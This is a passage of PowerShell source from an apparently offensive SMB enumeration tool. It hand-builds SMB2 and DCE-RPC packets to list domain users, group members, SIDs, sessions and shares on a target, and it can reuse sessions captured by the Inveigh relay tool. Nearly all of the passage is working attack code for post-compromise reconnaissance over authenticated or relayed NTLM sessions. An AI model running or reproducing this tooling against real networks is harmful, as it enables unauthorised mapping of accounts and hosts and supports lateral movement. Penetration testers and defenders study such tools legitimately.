                    }
                    else
                    {
                        Write-Output "[-] $output_username failed to authenticate on $Target"
                        $login_successful = $false
                    }

                }
                else
                {
                    if([System.BitConverter]::ToString($client_receive[12..15]) -eq '00-00-00-00')
                    {
                        Write-Verbose "[+] $output_username successfully authenticated on $Target"
                        $login_successful = $true
                    }
                    else
                    {
                        Write-Output "[-] $output_username failed to authenticate on $Target"
                        $login_successful = $false
                    }

                }

            }
            catch
            {
                $error_message = $_.Exception.Message
                $error_message = $error_message -replace "`n",""
                Write-Output "[-] $error_message"
                $login_successful = $false
            }

        }

    }

    if($login_successful -or $inveigh_session)
    {

        if($inveigh_session)
        {

            if($inveigh_session -and $inveigh.session_lock_table[$session] -eq 'locked')
            {
                Write-Output "[*] Pausing due to Inveigh Relay session lock"
                Start-Sleep -s 2
            }

            $inveigh.session_lock_table[$session] = 'locked'
            $client = $inveigh.session_socket_table[$session]
            $client_stream = $client.GetStream()
            $session_ID = $inveigh.session_table[$session]
            $message_ID =  $inveigh.session_message_ID_table[$session]
            $tree_ID = 0x00,0x00,0x00,0x00
            $SMB_signing = $false
        }

        if($Action -eq 'All')
        {
            $action_stage = 'group'
        }
        else
        {
            $action_stage = $Action    
        }

        $path = "\\" + $Target + "\IPC$"
        $path_bytes = [System.Text.Encoding]::Unicode.GetBytes($path)
        $j = 0
        $stage = 'TreeConnect'

        while ($stage -ne 'Exit')
        {

            try
            {
                
                switch ($stage)
                {
            
                    'CloseRequest'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x06,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB_data = New-PacketSMB2CloseRequest $file_ID
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if(Get-StatusPending $client_receive[12..15])
                        {
                            $stage = 'StatusPending'
                            $stage_next = 'StatusReceived'
                        }
                        else
                        {
                            $stage = 'StatusReceived'
                        }
                        
                    }

                    'Connect2'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMRConnect2 $Target
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x06,0x00,0x00,0x00 0x00,0x00 0x39,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if(Get-StatusPending $client_receive[12..15])
                        {
                            $stage = 'StatusPending'
                            $stage_next = 'StatusReceived'
                        }
                        else
                        {
                            $stage = 'StatusReceived'
                        }

                    }

                    'Connect5'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMRConnect5 $Target
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x06,0x00,0x00,0x00 0x00,0x00 0x40,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if(Get-StatusPending $client_receive[12..15])
                        {
                            $stage = 'StatusPending'
                            $stage_next = 'StatusReceived'
                        }
                        else
                        {
                            $stage = 'StatusReceived'
                        }
                        
                    }

                    'CreateRequest'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB_data = New-PacketSMB2CreateRequestFile $named_pipe
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data  
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data  
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        try
                        {
                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                            
                            if(Get-StatusPending $client_receive[12..15])
                            {
                                $stage = 'StatusPending'
                                $stage_next = 'StatusReceived'
                            }
                            else
                            {
                                $stage = 'StatusReceived'
                            }
                            
                        }
                        catch
                        {
                            Write-Output "[-] Session connection is closed"
                            $stage = 'Exit'
                        }

                    }

                    'EnumDomainUsers'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMREnumDomainUsers $SAMR_domain_handle
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x08,0x00,0x00,0x00 0x00,0x00 0x0d,0x00
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        
                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if(Get-StatusPending $client_receive[12..15])
                        {
                            $stage = 'StatusPending'
                            $stage_next = 'StatusReceived'
                        }
                        else
                        {
                            $stage = 'StatusReceived'
                        }
                        
                    }

                    'GetMembersInAlias'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMRGetMembersInAlias $SAMR_policy_handle
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x0d,0x00,0x00,0x00 0x00,0x00 0x21,0x00
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        
                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if(Get-StatusPending $client_receive[12..15])
                        {
                            $stage = 'StatusPending'
                            $stage_next = 'StatusReceived'
                        }
                        else
                        {
                            $stage = 'StatusReceived'
                        }

                    }

                    'Logoff'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x02,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB_data = New-PacketSMB2SessionLogoffRequest
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'Exit'
                    }

                    'LookupNames'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMRLookupNames $SAMR_domain_handle $Group
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x08,0x00,0x00,0x00 0x00,0x00 0x11,0x00
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        
                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        
                        if(Get-StatusPending $client_receive[12..15])
                        {
                            $stage = 'StatusPending'
                            $stage_next = 'StatusReceived'
                        }
                        else
                        {
                            $stage = 'StatusReceived'
                        }

                    }

                    'LookupRids'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMRLookupRids $SAMR_domain_handle $RID_count_bytes $RID_list
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x0b,0x00,0x00,0x00 0x00,0x00 0x12,0x00
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SAMR_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        
                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SAMR_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if(Get-StatusPending $client_receive[12..15])
                        {
                            $stage = 'StatusPending'
                            $stage_next = 'StatusReceived'
                        }
                        else
                        {
                            $stage = 'StatusReceived'
                        }
                        
                    }

                    'LSAClose'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_LSARPC_data = New-PacketLSAClose $policy_handle
                        $LSARPC_data = ConvertFrom-PacketOrderedDictionary $packet_LSARPC_data 
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $LSARPC_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $LSARPC_data.Length 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $LSARPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        
                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $LSARPC_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $LSARPC_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $step++

                        if(Get-StatusPending $client_receive[12..15])
                        {
                            $stage = 'StatusPending'
                            $stage_next = 'StatusReceived'
                        }
                        else
                        {
                            $stage = 'StatusReceived'
                        }

                    }

                    'LSALookupSids'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_LSARPC_data = New-PacketLSALookupSids $policy_handle $SID_array
                        $LSARPC_data = ConvertFrom-PacketOrderedDictionary $packet_LSARPC_data
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $LSARPC_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $LSARPC_data.Length 0 0 0x10,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data   
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $LSARPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $LSARPC_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $LSARPC_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if(Get-StatusPending $client_receive[12..15])
                        {
                            $stage = 'StatusPending'
                            $stage_next = 'StatusReceived'
                        }
                        else
                        {
                            $stage = 'StatusReceived'
                        }
                        
                    }

                    'LSAOpenPolicy'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_LSARPC_data = New-PacketLSAOpenPolicy
                        $LSARPC_data = ConvertFrom-PacketOrderedDictionary $packet_LSARPC_data 
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $LSARPC_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $LSARPC_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x06,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $LSARPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $LSARPC_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $LSARPC_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if(Get-StatusPending $client_receive[12..15])
                        {
                            $stage = 'StatusPending'
                            $stage_next = 'StatusReceived'
                        }
                        else
                        {
                            $stage = 'StatusReceived'
                        }
                
                    }

                    'LSAQueryInfoPolicy'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_LSARPC_data = New-PacketLSAQueryInfoPolicy $policy_handle
                        $LSARPC_data = ConvertFrom-PacketOrderedDictionary $packet_LSARPC_data
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $LSARPC_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $LSARPC_data.Length 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x07,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data   
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $LSARPC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $LSARPC_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $LSARPC_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if(Get-StatusPending $client_receive[12..15])
                        {
                            $stage = 'StatusPending'
                            $stage_next = 'StatusReceived'
                        }
                        else
                        {
                            $stage = 'StatusReceived'
                        }
                        
                    }

                    'NetSessEnum'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SRVSVC_data = New-PacketSRVSVCNetSessEnum $Target
                        $SRVSVC_data = ConvertFrom-PacketOrderedDictionary $packet_SRVSVC_data
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SRVSVC_data.Length 1024
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SRVSVC_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00                        
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SRVSVC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        
                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $SRVSVC_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SRVSVC_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if(Get-StatusPending $client_receive[12..15])
                        {
                            $stage = 'StatusPending'
                            $stage_next = 'StatusReceived'
                        }
                        else
                        {
                            $stage = 'StatusReceived'
                        }

                    }
                    
                    'NetShareEnumAll'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SRVSVC_data = New-PacketSRVSVCNetShareEnumAll $Target
                        $SRVSVC_data = ConvertFrom-PacketOrderedDictionary $packet_SRVSVC_data 
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SRVSVC_data.Length 4280
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SRVSVC_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data 
                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length + $SRVSVC_data.Length
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        
                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data + $RPC_data + $SRVSVC_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SRVSVC_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if(Get-StatusPending $client_receive[12..15])
                        {
                            $stage = 'StatusPending'
                            $stage_next = 'StatusReceived'
                        }
                        else
                        {
                            $stage = 'StatusReceived'
                        }

                    }

                    'OpenAlias'
                    {  
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x0b,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SAMR_data = New-PacketSAMROpenAlias $SAMR_domain_handle $SAMR_RID
                        $SAMR_data = ConvertFrom-PacketOrderedDictionary $packet_SAMR_data 
                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SAMR_data.Length 0 0 0x0c,0x00,0x00,0x00 0x00,0x00 0x1b,0x00
                        $packet_SMB_data = New-PacketSMB2IoctlRequest 0x17,0xc0,0x11,0x00 $file_ID $SAMR_data.Length 4280
